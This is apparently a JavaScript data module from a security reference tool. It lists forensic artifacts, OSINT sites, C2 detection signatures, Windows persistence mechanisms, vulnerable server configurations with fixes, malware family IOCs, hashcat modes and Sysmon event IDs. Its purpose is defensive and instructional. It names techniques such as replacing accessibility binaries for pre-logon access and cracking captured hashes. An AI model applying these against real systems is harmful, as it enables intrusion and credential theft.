    { artifact: 'SRUM Database', path: 'C:\\Windows\\System32\\SRU\\SRUDB.dat', tool: 'SrumECmd', importance: 'Medium', notes: 'System Resource Usage Monitor - network usage, app timelines' },
    { artifact: 'MFT', path: '\\\\.\\C:', tool: 'MFTECmd, Autopsy', importance: 'Critical', notes: 'Master File Table - all file metadata including deleted files' },
    { artifact: '$UsnJrnl', path: '\\\\.\\C:\\$Extend\\$UsnJrnl:\\$J', tool: 'MFTECmd', importance: 'High', notes: 'NTFS change journal - tracks file system changes' },
    { artifact: 'WMI Repository', path: 'C:\\Windows\\System32\\wbem\\Repository\\', tool: 'PyWMIPersistenceFinder', importance: 'High', notes: 'WMI event subscriptions used for persistence' },
    { artifact: 'RDP Bitmap Cache', path: 'C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\', tool: 'bmc-tools', importance: 'Medium', notes: 'Cached RDP session screenshots - visual evidence' },
  ],
  linux: [
    { artifact: 'Auth Logs', path: '/var/log/auth.log or /var/log/secure', tool: 'grep, journalctl', importance: 'Critical', notes: 'Authentication events, sudo usage, SSH logins' },
    { artifact: 'Syslog', path: '/var/log/syslog or /var/log/messages', tool: 'grep, journalctl', importance: 'Critical', notes: 'System events, service start/stop, kernel messages' },
    { artifact: 'Bash History', path: '/home/<user>/.bash_history', tool: 'cat, grep', importance: 'Critical', notes: 'Command history for each user - check root too' },
    { artifact: 'Cron Jobs', path: '/etc/crontab, /etc/cron.d/, /var/spool/cron/', tool: 'crontab -l', importance: 'High', notes: 'Scheduled tasks - common persistence mechanism' },
    { artifact: 'SSH Keys', path: '/home/<user>/.ssh/', tool: 'ls, stat', importance: 'High', notes: 'authorized_keys, known_hosts, id_rsa - check for attacker keys' },
    { artifact: 'Process List', path: '/proc/', tool: 'ps aux, ls -la /proc/*/exe', importance: 'Critical', notes: 'Running processes and their binary locations' },
    { artifact: 'Network Connections', path: '/proc/net/', tool: 'ss -tlnp, netstat -tlnp', importance: 'Critical', notes: 'Active network connections and listening ports' },
    { artifact: 'Login Records', path: '/var/log/wtmp, /var/log/btmp, /var/log/lastlog', tool: 'last, lastb, lastlog', importance: 'High', notes: 'Login history, failed logins, last login per user' },
    { artifact: 'Systemd Services', path: '/etc/systemd/system/, /lib/systemd/system/', tool: 'systemctl list-units', importance: 'High', notes: 'Service definitions - check for malicious services' },
    { artifact: 'Kernel Modules', path: '/lib/modules/, /proc/modules', tool: 'lsmod, modinfo', importance: 'High', notes: 'Loaded kernel modules - check for rootkit modules' },
    { artifact: 'Package History', path: '/var/log/dpkg.log or /var/log/yum.log', tool: 'cat, grep', importance: 'Medium', notes: 'Package install/remove history' },
    { artifact: 'File Timestamps', path: 'Filesystem', tool: 'stat, find -newer', importance: 'High', notes: 'MACB timestamps for timeline analysis - use find for anomalies' },
    { artifact: 'Web Server Logs', path: '/var/log/apache2/ or /var/log/nginx/', tool: 'grep, GoAccess', importance: 'High', notes: 'Access and error logs for web exploitation evidence' },
    { artifact: 'Audit Logs', path: '/var/log/audit/', tool: 'ausearch, aureport', importance: 'Critical', notes: 'Linux Audit Framework logs - syscall tracking' },
    { artifact: 'Docker Logs', path: '/var/lib/docker/', tool: 'docker logs, docker inspect', importance: 'Medium', notes: 'Container logs, configurations, and image layers' },
  ],
};

// ============================================================================
// OSINT TOOLS REFERENCE
// ============================================================================
const OSINT_TOOLS = [
  { name: 'Shodan', url: 'https://shodan.io', category: 'Infrastructure', desc: 'Internet-connected device search engine - find exposed services, IoT, SCADA', free: true },
  { name: 'Censys', url: 'https://censys.io', category: 'Infrastructure', desc: 'Internet-wide scan data - certificates, hosts, protocols', free: true },
  { name: 'VirusTotal', url: 'https://virustotal.com', category: 'Malware', desc: 'Multi-AV file/URL scanner, community intelligence, YARA hunting', free: true },
  { name: 'URLhaus', url: 'https://urlhaus.abuse.ch', category: 'Threat Intel', desc: 'Malware URL database from abuse.ch', free: true },
  { name: 'MalwareBazaar', url: 'https://bazaar.abuse.ch', category: 'Malware', desc: 'Malware sample sharing - download samples for analysis', free: true },
  { name: 'ThreatFox', url: 'https://threatfox.abuse.ch', category: 'Threat Intel', desc: 'IOC sharing platform - IPs, domains, hashes, URLs', free: true },
  { name: 'Hybrid Analysis', url: 'https://hybrid-analysis.com', category: 'Malware', desc: 'Free malware analysis sandbox with detailed reports', free: true },
  { name: 'ANY.RUN', url: 'https://any.run', category: 'Malware', desc: 'Interactive malware sandbox - see real-time execution', free: true },
  { name: 'crt.sh', url: 'https://crt.sh', category: 'Certificates', desc: 'Certificate Transparency log search - find subdomains via SSL certs', free: true },
  { name: 'SecurityTrails', url: 'https://securitytrails.com', category: 'DNS/Infrastructure', desc: 'Historical DNS data, subdomain enumeration, WHOIS history', free: true },
  { name: 'MITRE ATT&CK', url: 'https://attack.mitre.org', category: 'Framework', desc: 'Adversary tactics and techniques knowledge base', free: true },
  { name: 'Greynoise', url: 'https://greynoise.io', category: 'Threat Intel', desc: 'Internet background noise analysis - identify scanners and botnets', free: true },
  { name: 'AlienVault OTX', url: 'https://otx.alienvault.com', category: 'Threat Intel', desc: 'Open Threat Exchange - community threat intelligence sharing', free: true },
  { name: 'MISP', url: 'https://misp-project.org', category: 'Threat Intel', desc: 'Open source threat intelligence platform - IOC sharing and correlation', free: true },
  { name: 'Wayback Machine', url: 'https://web.archive.org', category: 'OSINT', desc: 'Historical website snapshots - find old configurations and content', free: true },
  { name: 'DNSDumpster', url: 'https://dnsdumpster.com', category: 'DNS', desc: 'DNS reconnaissance and research - find subdomains and DNS records', free: true },
  { name: 'Have I Been Pwned', url: 'https://haveibeenpwned.com', category: 'Credentials', desc: 'Check if email/password appears in known data breaches', free: true },
  { name: 'OSINT Framework', url: 'https://osintframework.com', category: 'OSINT', desc: 'Collection of OSINT tools organized by category', free: true },
  { name: 'Maltego', url: 'https://maltego.com', category: 'OSINT', desc: 'Interactive data mining and link analysis for investigations', free: false },
  { name: 'SpiderFoot', url: 'https://spiderfoot.net', category: 'OSINT', desc: 'Automated OSINT collection and reconnaissance', free: true },
  { name: 'theHarvester', url: 'https://github.com/laramies/theHarvester', category: 'Recon', desc: 'Email, subdomain, and name harvesting from public sources', free: true },
  { name: 'Recon-ng', url: 'https://github.com/lanmaster53/recon-ng', category: 'Recon', desc: 'Web reconnaissance framework with modular architecture', free: true },
  { name: 'Amass', url: 'https://github.com/owasp-amass/amass', category: 'Subdomain', desc: 'In-depth attack surface mapping and subdomain enumeration', free: true },
  { name: 'Subfinder', url: 'https://github.com/projectdiscovery/subfinder', category: 'Subdomain', desc: 'Fast passive subdomain discovery tool', free: true },
  { name: 'Nuclei', url: 'https://github.com/projectdiscovery/nuclei', category: 'Vulnerability', desc: 'Fast vulnerability scanner based on community templates', free: true },
];

// ============================================================================
// NETWORK PROTOCOL ANALYSIS SIGNATURES
// ============================================================================
const PROTOCOL_SIGNATURES = [
  { protocol: 'HTTP', port: 80, signature: 'GET / HTTP/1.1\\r\\nHost:', description: 'Standard HTTP request', threat: false },
  { protocol: 'HTTPS/TLS', port: 443, signature: '\\x16\\x03\\x01 (TLS ClientHello)', description: 'TLS 1.0+ handshake initiation', threat: false },
  { protocol: 'SSH', port: 22, signature: 'SSH-2.0-', description: 'SSH protocol version 2 banner', threat: false },
  { protocol: 'SMBv1', port: 445, signature: '\\xff\\x53\\x4d\\x42 (\\xffSMB)', description: 'SMBv1 protocol - DEPRECATED and vulnerable', threat: true },
  { protocol: 'SMBv2/3', port: 445, signature: '\\xfe\\x53\\x4d\\x42 (\\xfeSMB)', description: 'SMBv2/v3 protocol negotiation', threat: false },
  { protocol: 'DNS Query', port: 53, signature: 'Transaction ID + Flags + Questions', description: 'Standard DNS query', threat: false },
  { protocol: 'DNS over HTTPS', port: 443, signature: 'application/dns-message', description: 'DoH - encrypted DNS, may bypass monitoring', threat: true },
  { protocol: 'Kerberos AS-REQ', port: 88, signature: '\\x6a (ASN.1 Application 10)', description: 'Kerberos authentication request', threat: false },
  { protocol: 'Kerberos TGS-REQ', port: 88, signature: '\\x6c (ASN.1 Application 12)', description: 'Kerberos ticket-granting service request', threat: false },
  { protocol: 'LDAP Bind', port: 389, signature: '\\x30 + BindRequest', description: 'LDAP authentication bind', threat: false },
  { protocol: 'RDP', port: 3389, signature: '\\x03\\x00 (TPKT Header)', description: 'RDP connection initiation', threat: false },
  { protocol: 'ICMP Echo', port: 0, signature: 'Type 8 Code 0', description: 'ICMP ping request', threat: false },
  { protocol: 'ICMP Tunnel', port: 0, signature: 'ICMP with data > 64 bytes', description: 'Possible ICMP data tunneling', threat: true },
  { protocol: 'Cobalt Strike', port: 443, signature: 'Consistent beacon interval 60s, JA3: 72a589da586844d7f0818ce684948eea', description: 'Cobalt Strike Beacon C2 communication pattern', threat: true },
  { protocol: 'Metasploit', port: 4444, signature: 'Meterpreter stage transfer pattern', description: 'Metasploit default reverse shell port', threat: true },
  { protocol: 'Sliver C2', port: 443, signature: 'mTLS with self-signed certificate', description: 'Sliver C2 framework communication', threat: true },
  { protocol: 'Empire C2', port: 443, signature: 'HTTP with /login/process.php or /admin/get.php', description: 'PowerShell Empire C2 URI patterns', threat: true },
  { protocol: 'WireGuard VPN', port: 51820, signature: 'UDP with 32-byte initiator key', description: 'WireGuard VPN tunnel - may indicate unauthorized VPN', threat: true },
  { protocol: 'Tor', port: 9001, signature: 'TLS with specific cipher suites', description: 'Tor relay/bridge connection', threat: true },
  { protocol: 'Bitcoin P2P', port: 8333, signature: '\\xf9\\xbe\\xb4\\xd9 (Magic bytes)', description: 'Bitcoin network protocol - may indicate mining', threat: true },
];


// ============================================================================
// WINDOWS PERSISTENCE MECHANISMS DATABASE
// ============================================================================
const PERSISTENCE_MECHANISMS = [
  { name: 'Registry Run Keys', location: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', mitre: 'T1547.001', detection: 'Sysmon EID 13 (Registry value set)', risk: 'High', persistence: 'User logon', notes: 'Per-user autorun entries. Check HKLM equivalent for all-users persistence.' },
  { name: 'Startup Folder', location: 'C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup', mitre: 'T1547.001', detection: 'Sysmon EID 11 (File create)', risk: 'Medium', persistence: 'User logon', notes: 'Files or shortcuts in this folder run at user logon.' },
  { name: 'Scheduled Tasks', location: 'C:\\Windows\\System32\\Tasks\\', mitre: 'T1053.005', detection: 'Security EID 4698, Sysmon EID 1', risk: 'High', persistence: 'Configurable trigger', notes: 'Can be triggered by time, event, logon, or boot. XML format.' },
  { name: 'Windows Services', location: 'HKLM\\SYSTEM\\CurrentControlSet\\Services', mitre: 'T1543.003', detection: 'System EID 7045, Security EID 4697', risk: 'Critical', persistence: 'System boot', notes: 'Services run as SYSTEM by default. Check for unusual service binaries.' },
  { name: 'WMI Event Subscription', location: 'WMI Repository', mitre: 'T1546.003', detection: 'Sysmon EID 19/20/21', risk: 'Critical', persistence: 'Event-based', notes: 'Fileless persistence via WMI permanent event consumers. Very stealthy.' },
  { name: 'DLL Search Order Hijack', location: 'Application directories', mitre: 'T1574.001', detection: 'Sysmon EID 7 (Image loaded)', risk: 'High', persistence: 'Application execution', notes: 'Plant malicious DLL in app directory to be loaded before legitimate one.' },
  { name: 'COM Object Hijacking', location: 'HKCU\\Software\\Classes\\CLSID\\', mitre: 'T1546.015', detection: 'Sysmon EID 13', risk: 'High', persistence: 'COM object invocation', notes: 'Override COM object to execute attacker code when legitimate app calls COM.' },
  { name: 'Winlogon Helper', location: 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell or Userinit', mitre: 'T1547.004', detection: 'Sysmon EID 13', risk: 'Critical', persistence: 'User logon', notes: 'Runs during Windows logon process. Shell default is explorer.exe.' },
  { name: 'Image File Execution Options', location: 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\', mitre: 'T1546.012', detection: 'Sysmon EID 13', risk: 'High', persistence: 'Target binary execution', notes: 'Debugger value causes another binary to run when target is launched.' },
  { name: 'AppInit DLLs', location: 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs', mitre: 'T1546.010', detection: 'Sysmon EID 13', risk: 'Critical', persistence: 'Any process using user32.dll', notes: 'DLL loaded into every process that loads user32.dll. Disabled by default on Win 8+.' },
  { name: 'Security Support Provider', location: 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages', mitre: 'T1547.005', detection: 'Sysmon EID 13', risk: 'Critical', persistence: 'System boot', notes: 'SSP DLLs are loaded by LSASS. Can intercept credentials (mimilib.dll).' },
  { name: 'Boot Execute', location: 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute', mitre: 'T1542.003', detection: 'Sysmon EID 13', risk: 'Critical', persistence: 'System boot (before logon)', notes: 'Runs native executables during boot before Windows logon screen.' },
  { name: 'Accessibility Features', location: 'C:\\Windows\\System32\\sethc.exe (Sticky Keys)', mitre: 'T1546.008', detection: 'Sysmon EID 11 (File modify), EID 1', risk: 'High', persistence: 'Pre-logon trigger', notes: 'Replace accessibility executables (sethc.exe, utilman.exe) with cmd.exe for pre-auth RCE.' },
  { name: 'Print Monitor', location: 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\', mitre: 'T1547.010', detection: 'Sysmon EID 13, EID 7', risk: 'High', persistence: 'Spooler service start', notes: 'DLL loaded by spooler service (runs as SYSTEM).' },
  { name: 'Netsh Helper DLL', location: 'HKLM\\SOFTWARE\\Microsoft\\NetSh', mitre: 'T1546.007', detection: 'Sysmon EID 13', risk: 'Medium', persistence: 'netsh.exe execution', notes: 'DLL loaded whenever netsh.exe is invoked.' },
  { name: 'Office Startup', location: 'C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Word\\STARTUP\\', mitre: 'T1137', detection: 'Sysmon EID 11', risk: 'Medium', persistence: 'Office application launch', notes: 'Templates in Office STARTUP folders execute on app open.' },
  { name: 'Screensaver', location: 'HKCU\\Control Panel\\Desktop\\SCRNSAVE.EXE', mitre: 'T1546.002', detection: 'Sysmon EID 13', risk: 'Medium', persistence: 'Screen lock/idle', notes: 'Custom screensaver executable runs when screen locks.' },
  { name: 'Browser Extensions', location: 'AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\', mitre: 'T1176', detection: 'Sysmon EID 11, browser logs', risk: 'High', persistence: 'Browser launch', notes: 'Malicious browser extensions can steal credentials, inject content.' },
  { name: 'GPO Startup Script', location: 'SYSVOL\\<domain>\\Policies\\', mitre: 'T1484.001', detection: 'Security EID 5136, GPO auditing', risk: 'Critical', persistence: 'Group Policy refresh', notes: 'Scripts deployed via Group Policy run on target machines. Domain-wide impact.' },
  { name: 'Active Setup', location: 'HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\', mitre: 'T1547.014', detection: 'Sysmon EID 13', risk: 'Medium', persistence: 'New user logon', notes: 'Runs once per user profile. Used for first-run setup but abused for persistence.' },
];

// ============================================================================
// COMMON VULNERABLE CONFIGURATIONS
// ============================================================================
const VULNERABLE_CONFIGS = [
  { service: 'Apache', file: 'httpd.conf', issue: 'Directory Listing Enabled', config: 'Options Indexes FollowSymLinks', fix: 'Options -Indexes +FollowSymLinks', risk: 'Medium' },
  { service: 'Apache', file: 'httpd.conf', issue: 'Server Version Disclosure', config: 'ServerTokens Full\nServerSignature On', fix: 'ServerTokens Prod\nServerSignature Off', risk: 'Low' },
  { service: 'Apache', file: '.htaccess', issue: 'Missing Security Headers', config: '(none)', fix: 'Header always set X-Content-Type-Options "nosniff"\nHeader always set X-Frame-Options "DENY"\nHeader always set Strict-Transport-Security "max-age=31536000"', risk: 'Medium' },
  { service: 'Nginx', file: 'nginx.conf', issue: 'Server Version Disclosure', config: '(default)', fix: 'server_tokens off;', risk: 'Low' },
  { service: 'Nginx', file: 'nginx.conf', issue: 'Missing Rate Limiting', config: '(none)', fix: 'limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;\nlimit_req zone=one burst=20 nodelay;', risk: 'Medium' },
  { service: 'Nginx', file: 'nginx.conf', issue: 'Weak SSL Configuration', config: 'ssl_protocols TLSv1 TLSv1.1 TLSv1.2;', fix: 'ssl_protocols TLSv1.2 TLSv1.3;\nssl_ciphers HIGH:!aNULL:!MD5;', risk: 'High' },
  { service: 'MySQL', file: 'my.cnf', issue: 'Remote Root Login', config: 'bind-address = 0.0.0.0', fix: 'bind-address = 127.0.0.1', risk: 'Critical' },
  { service: 'MySQL', file: 'my.cnf', issue: 'Local File Read', config: 'local_infile = ON', fix: 'local_infile = OFF', risk: 'High' },
  { service: 'PostgreSQL', file: 'pg_hba.conf', issue: 'Trust Authentication', config: 'host all all 0.0.0.0/0 trust', fix: 'host all all 127.0.0.1/32 scram-sha-256', risk: 'Critical' },
  { service: 'Redis', file: 'redis.conf', issue: 'No Authentication', config: '# requirepass (commented out)', fix: 'requirepass YourStrongPasswordHere\nbind 127.0.0.1', risk: 'Critical' },
  { service: 'MongoDB', file: 'mongod.conf', issue: 'No Authentication', config: '#security:\n#  authorization: disabled', fix: 'security:\n  authorization: enabled\nnet:\n  bindIp: 127.0.0.1', risk: 'Critical' },
  { service: 'Docker', file: 'daemon.json', issue: 'Exposed Docker API', config: '{"hosts": ["tcp://0.0.0.0:2375"]}', fix: '{"hosts": ["unix:///var/run/docker.sock"]}\n# If remote needed: use TLS mutual auth on port 2376', risk: 'Critical' },
  { service: 'Kubernetes', file: 'kube-apiserver', issue: 'Anonymous Authentication', config: '--anonymous-auth=true', fix: '--anonymous-auth=false\n--authorization-mode=RBAC', risk: 'Critical' },
  { service: 'SSH', file: 'sshd_config', issue: 'Root Login Allowed', config: 'PermitRootLogin yes', fix: 'PermitRootLogin no\nAllowUsers specific_user', risk: 'High' },
  { service: 'SSH', file: 'sshd_config', issue: 'Password Authentication', config: 'PasswordAuthentication yes', fix: 'PasswordAuthentication no\nPubkeyAuthentication yes', risk: 'Medium' },
  { service: 'SSH', file: 'sshd_config', issue: 'Weak Algorithms', config: 'Ciphers aes128-cbc,3des-cbc', fix: 'Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com\nKexAlgorithms curve25519-sha256', risk: 'Medium' },
  { service: 'PHP', file: 'php.ini', issue: 'Dangerous Functions Enabled', config: 'disable_functions = (empty)', fix: 'disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec', risk: 'High' },
  { service: 'PHP', file: 'php.ini', issue: 'Display Errors in Production', config: 'display_errors = On', fix: 'display_errors = Off\nlog_errors = On', risk: 'Medium' },
  { service: 'PHP', file: 'php.ini', issue: 'Allow URL Include', config: 'allow_url_include = On', fix: 'allow_url_include = Off', risk: 'Critical' },
  { service: 'WordPress', file: 'wp-config.php', issue: 'Debug Mode in Production', config: "define('WP_DEBUG', true);", fix: "define('WP_DEBUG', false);", risk: 'Medium' },
  { service: 'WordPress', file: 'wp-config.php', issue: 'File Editor Enabled', config: '(default - enabled)', fix: "define('DISALLOW_FILE_EDIT', true);", risk: 'High' },
  { service: 'Elasticsearch', file: 'elasticsearch.yml', issue: 'No Security', config: 'xpack.security.enabled: false', fix: 'xpack.security.enabled: true\nxpack.security.transport.ssl.enabled: true', risk: 'Critical' },
  { service: 'AWS S3', file: 'Bucket Policy', issue: 'Public Access', config: '{"Effect":"Allow","Principal":"*","Action":"s3:GetObject"}', fix: '{"Effect":"Deny","Principal":"*","Action":"s3:*","Condition":{"Bool":{"aws:SecureTransport":"false"}}}', risk: 'Critical' },
  { service: 'AWS IAM', file: 'IAM Policy', issue: 'Wildcard Permissions', config: '{"Effect":"Allow","Action":"*","Resource":"*"}', fix: 'Apply least privilege: specify exact actions and resources needed', risk: 'Critical' },
];

// ============================================================================
// MALWARE FAMILIES DATABASE
// ============================================================================
const MALWARE_FAMILIES = [
  { name: 'Cobalt Strike', type: 'C2 Framework', origin: 'Commercial (abused)', firstSeen: '2012', activeSince: 'Ongoing', techniques: ['T1059.001','T1071.001','T1055','T1027'], iocs: { ja3: '72a589da586844d7f0818ce684948eea', pipes: ['\\\\.\\pipe\\msagent_*','\\\\.\\pipe\\MSSE-*'], userAgent: 'Mozilla/5.0 (compatible; MSIE 10.0)' }, description: 'Legitimate red team tool heavily abused by APTs and ransomware groups. Features include beacon, pivoting, credential theft, and post-exploitation.' },
  { name: 'Mimikatz', type: 'Credential Theft', origin: 'Open Source', firstSeen: '2007', activeSince: 'Ongoing', techniques: ['T1003.001','T1003.006','T1558.001','T1558.003'], iocs: { hashes: [], strings: ['gentilkiwi','mimikatz','sekurlsa','kerberos::golden'] }, description: 'The most widely used credential dumping tool. Extracts passwords, hashes, tickets from LSASS memory. Also forges Kerberos tickets.' },
  { name: 'Emotet', type: 'Loader/Botnet', origin: 'Cybercrime', firstSeen: '2014', activeSince: 'Ongoing (revived 2021)', techniques: ['T1566.001','T1059.005','T1071.001','T1547.001'], iocs: { ports: [443,8080,7080], dropperType: 'Macro-enabled Office docs, OneNote' }, description: 'Originally banking trojan, evolved into major malware distribution platform. Delivers TrickBot, QakBot, and ransomware.' },
  { name: 'QakBot', type: 'Banking Trojan/Loader', origin: 'Cybercrime', firstSeen: '2007', activeSince: 'Ongoing', techniques: ['T1566.001','T1059.001','T1055','T1021.002'], iocs: { ports: [443,995], dropperType: 'ISO/LNK/OneNote files' }, description: 'Modular banking trojan and malware loader. Steals credentials, enables lateral movement, delivers ransomware (BlackBasta, REvil).' },
  { name: 'TrickBot', type: 'Banking Trojan/Loader', origin: 'Cybercrime (Wizard Spider)', firstSeen: '2016', activeSince: 'Declined (Conti dissolution)', techniques: ['T1566.001','T1059','T1003','T1021'], iocs: { ports: [443,447,449], modules: ['systeminfo','networkDll','psfin','injectDll'] }, description: 'Modular botnet with credential theft, AD recon, and lateral movement. Previously primary delivery for Ryuk and Conti ransomware.' },
  { name: 'ShadowPad', type: 'Modular Backdoor', origin: 'China (APT41/Winnti)', firstSeen: '2017', activeSince: 'Ongoing', techniques: ['T1195.002','T1059','T1071','T1003'], iocs: { ports: [443,80], communication: 'Custom encrypted protocol' }, description: 'Successor to PlugX. Modular backdoor shared among multiple Chinese APT groups. Delivered via supply chain attacks (CCleaner, ASUS LiveUpdate).' },
  { name: 'PlugX', type: 'RAT', origin: 'China', firstSeen: '2008', activeSince: 'Ongoing', techniques: ['T1574.001','T1059','T1071','T1005'], iocs: { sideloading: 'Legitimate EXE + malicious DLL + encrypted payload', ports: [443,80,8080] }, description: 'Long-running Chinese RAT using DLL side-loading. Provides file management, screen capture, keylogging, and remote shell.' },
  { name: 'AsyncRAT', type: 'RAT', origin: 'Open Source', firstSeen: '2019', activeSince: 'Ongoing', techniques: ['T1566','T1059.001','T1056.001','T1113'], iocs: { ports: [6606,7707,8808], language: '.NET' }, description: 'Open source remote access tool commonly weaponized. Features keylogging, screen capture, file management, and crypto mining.' },
  { name: 'Sliver', type: 'C2 Framework', origin: 'Open Source (BishopFox)', firstSeen: '2019', activeSince: 'Ongoing', techniques: ['T1059','T1071','T1055','T1573'], iocs: { protocols: ['mTLS','WireGuard','HTTP/S','DNS'], language: 'Go' }, description: 'Open source C2 framework increasingly used as Cobalt Strike alternative. Supports multiple C2 protocols and cross-platform implants.' },
  { name: 'Brute Ratel', type: 'C2 Framework', origin: 'Commercial', firstSeen: '2020', activeSince: 'Ongoing', techniques: ['T1059','T1071','T1055.012','T1027'], iocs: { evasion: 'Unhooks NTDLL, direct syscalls', badge: 'badger' }, description: 'Advanced C2 designed for EDR evasion. Uses direct syscalls, NTDLL unhooking, and custom encryption. Cracked versions widely distributed.' },
];

// ============================================================================
// HASH CRACKING REFERENCE
// ============================================================================
const HASH_TYPES = [
  { name: 'NTLM', hashcat: 1000, format: '32 hex chars', example: 'a4f49c406510bdcab6824ee7c30fd852', speed: '~100 GH/s (RTX 4090)', notes: 'Windows password hash. No salt. Extremely fast to crack.' },
  { name: 'NTLMv2', hashcat: 5600, format: 'user::domain:challenge:response', example: 'admin::N46iSNekpT:08ca45b7...', speed: '~10 GH/s', notes: 'Network authentication hash. Captured via Responder/MITM.' },
  { name: 'Kerberos TGS (RC4)', hashcat: 13100, format: '$krb5tgs$23$*...', example: '$krb5tgs$23$*user$realm$spn*$...', speed: '~1 GH/s', notes: 'Kerberoasting hash. Offline crackable service ticket.' },
  { name: 'Kerberos AS-REP', hashcat: 18200, format: '$krb5asrep$23$...', example: '$krb5asrep$23$user@realm:...', speed: '~1 GH/s', notes: 'AS-REP roasting hash. Users without pre-auth.' },
  { name: 'MD5', hashcat: 0, format: '32 hex chars', example: '5d41402abc4b2a76b9719d911017c592', speed: '~160 GH/s', notes: 'Extremely weak. Rainbow tables available. Never use for passwords.' },
  { name: 'SHA-1', hashcat: 100, format: '40 hex chars', example: 'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d', speed: '~50 GH/s', notes: 'Deprecated for security use. Fast to crack.' },
  { name: 'SHA-256', hashcat: 1400, format: '64 hex chars', example: '2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824', speed: '~20 GH/s', notes: 'Better than MD5/SHA1 but still fast without salting.' },
  { name: 'SHA-512', hashcat: 1700, format: '128 hex chars', example: 'cf83e1357eef...', speed: '~5 GH/s', notes: 'Linux shadow file format (sha512crypt is mode 1800).' },
  { name: 'sha512crypt', hashcat: 1800, format: '$6$salt$hash', example: '$6$rounds=5000$salt$hash...', speed: '~1 MH/s', notes: 'Linux /etc/shadow default. 5000 rounds by default. Much slower to crack.' },
  { name: 'bcrypt', hashcat: 3200, format: '$2a$cost$salt+hash', example: '$2a$12$WJ7Wj...', speed: '~100 KH/s', notes: 'Strong password hashing. Cost factor makes it intentionally slow.' },
  { name: 'Active Directory (cached)', hashcat: 2100, format: '$DCC2$iterations#user#hash', example: '$DCC2$10240#user#hash...', speed: '~500 KH/s', notes: 'Domain Cached Credentials v2. Stored on workstations for offline logon.' },
  { name: 'WPA/WPA2', hashcat: 22000, format: 'PMKID or 4-way handshake', example: 'WPA*02*...', speed: '~1 MH/s', notes: 'WiFi password hash. Captured via PMKID attack or deauth + handshake capture.' },
  { name: 'MS Office 2013+', hashcat: 9600, format: '$office$*2013*...', example: '$office$*2013*...', speed: '~50 KH/s', notes: 'Microsoft Office document password. AES-256 with 100,000 SHA-512 iterations.' },
  { name: 'KeePass', hashcat: 13400, format: '$keepass$*...', example: '$keepass$*2*...', speed: '~100 KH/s', notes: 'KeePass database master password. AES + key transformation rounds.' },
];


// ============================================================================
// WINDOWS EVENT ID REFERENCE (for SIEM/Detection)
// ============================================================================
const WINDOWS_EVENTS = [
  { eid: 1, source: 'Sysmon', name: 'Process Create', desc: 'A new process has been created', forensic: 'Critical', usage: 'Track all process executions with full command line, parent process, and hashes' },
  { eid: 2, source: 'Sysmon', name: 'Process Changed File Creation Time', desc: 'File creation timestamp changed (timestomping)', forensic: 'High', usage: 'Detect timestomping anti-forensic technique' },
  { eid: 3, source: 'Sysmon', name: 'Network Connection', desc: 'TCP/UDP connection detected', forensic: 'High', usage: 'Track process network connections, identify C2, lateral movement' },
  { eid: 7, source: 'Sysmon', name: 'Image Loaded', desc: 'A module (DLL) was loaded', forensic: 'Medium', usage: 'Detect DLL side-loading, injection, suspicious library loads' },
  { eid: 8, source: 'Sysmon', name: 'CreateRemoteThread', desc: 'Thread created in another process', forensic: 'Critical', usage: 'Detect process injection - common in credential theft and C2' },
  { eid: 10, source: 'Sysmon', name: 'ProcessAccess', desc: 'A process opened another process', forensic: 'Critical', usage: 'Detect LSASS access (credential dumping), process hollowing' },
  { eid: 11, source: 'Sysmon', name: 'FileCreate', desc: 'A file was created', forensic: 'Medium', usage: 'Track file creation for malware drops, web shells, persistence' },
  { eid: 12, source: 'Sysmon', name: 'Registry Object Added/Deleted', desc: 'Registry key or value created/deleted', forensic: 'High', usage: 'Detect persistence via registry (Run keys, services, COM objects)' },
  { eid: 13, source: 'Sysmon', name: 'Registry Value Set', desc: 'Registry value modified', forensic: 'High', usage: 'Detect persistence modifications, configuration tampering' },
  { eid: 15, source: 'Sysmon', name: 'FileCreateStreamHash', desc: 'Alternate Data Stream created', forensic: 'High', usage: 'Detect malware hidden in NTFS Alternate Data Streams' },
  { eid: 17, source: 'Sysmon', name: 'PipeEvent (Created)', desc: 'Named pipe created', forensic: 'Medium', usage: 'Detect C2 named pipes (Cobalt Strike, Metasploit patterns)' },
  { eid: 19, source: 'Sysmon', name: 'WmiEvent (Filter)', desc: 'WMI event filter registered', forensic: 'Critical', usage: 'Detect WMI-based persistence mechanism creation' },
  { eid: 20, source: 'Sysmon', name: 'WmiEvent (Consumer)', desc: 'WMI event consumer registered', forensic: 'Critical', usage: 'Detect WMI event consumer binding (persistence)' },
  { eid: 21, source: 'Sysmon', name: 'WmiEvent (Binding)', desc: 'WMI filter to consumer binding', forensic: 'Critical', usage: 'Confirms WMI persistence chain complete (filter + consumer + binding)' },
  { eid: 22, source: 'Sysmon', name: 'DNSEvent', desc: 'DNS query logged', forensic: 'Medium', usage: 'Track DNS queries for C2 domains, DGA detection, DNS tunneling' },
  { eid: 23, source: 'Sysmon', name: 'FileDelete (archived)', desc: 'File deletion with archive', forensic: 'High', usage: 'Capture deleted files for malware analysis and forensics' },
  { eid: 25, source: 'Sysmon', name: 'ProcessTampering', desc: 'Process image change detected', forensic: 'Critical', usage: 'Detect process hollowing, herpaderping, ghosting techniques' },
  { eid: 26, source: 'Sysmon', name: 'FileDeleteDetected', desc: 'File deletion logged', forensic: 'Medium', usage: 'Track anti-forensic file deletion, malware cleanup' },
